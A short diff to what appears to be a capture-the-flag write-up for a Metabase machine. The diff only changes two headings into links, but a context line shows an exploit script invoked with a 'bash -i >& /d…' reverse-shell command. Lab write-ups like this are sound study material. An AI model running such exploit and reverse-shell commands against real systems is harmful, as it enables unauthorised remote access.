@@ -11,7 +11,7 @@ nano /etc/hosts                                        # Map domain + subdomain
 
 ---
 
-## 🕸️ Web Application Analysis
+## 🕸️ [Web Application Analysis](HTTP)
 
 ```http
 http://data.analytical.htb/auth/login                 # Found Metabase login portal
@@ -36,7 +36,7 @@ python3 main.py -u http://data.analytical.htb -t <setup-token> -c "bash -i >& /d
 
 ---
 
-## 🐚 Shell Access & User PrivEsc
+## 🐚 [Shell](SSH) Access & User PrivEsc
 
 ```bash
 cd /home/metabase                                    # Check for user flag (none found)
